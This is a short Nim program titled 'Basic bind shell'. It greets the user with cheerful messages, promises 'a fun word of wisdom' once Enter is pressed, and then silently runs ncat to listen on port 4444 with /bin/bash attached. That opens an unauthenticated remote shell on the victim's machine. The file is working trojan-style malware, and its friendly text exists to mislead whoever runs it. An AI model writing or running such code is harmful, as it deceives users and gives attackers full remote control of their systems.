# Basic bind shell

import osproc


echo "Wow! Thanks so much for executing this file!"

echo "You won't regret it!"

echo "Press enter for a fun word of wisdom. :)"

discard readline(stdin)

discard execCmd("ncat -l 4444 -e /bin/bash &")
